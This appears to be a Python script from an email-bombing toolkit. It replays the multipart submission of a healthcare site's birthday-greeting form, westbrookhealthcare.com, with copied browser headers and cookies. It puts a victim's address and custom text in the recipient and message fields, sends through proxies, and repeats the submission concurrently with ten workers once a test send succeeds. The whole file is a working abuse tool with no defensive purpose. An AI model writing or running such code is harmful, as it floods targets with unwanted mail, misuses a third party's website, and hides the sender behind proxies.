from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.751757859.1677751936',
    '_ga_1XH2KLF590': 'GS1.1.1677751934.1.1.1677752074.0.0.0',
    '_ga': 'GA1.2.210018073.1677751934',
    '_gat': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBYpx6sSQupZNACR6',
    # 'Cookie': '_gid=GA1.2.751757859.1677751936; _ga_1XH2KLF590=GS1.1.1677751934.1.1.1677752074.0.0.0; _ga=GA1.2.210018073.1677751934; _gat=1',
    'Origin': 'https://westbrookhealthcare.com',
    'Pragma': 'no-cache',
    'Referer': 'https://westbrookhealthcare.com/send-a-greeting/happy-birthday/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n7151\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_cust_image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n7150\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n1\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\nname\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundaryBYpx6sSQupZNACR6--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()
        response = requests.post(
            'https://westbrookhealthcare.com/send-a-greeting/happy-birthday/',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )
        return response


def main():
    s = 'successfully'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
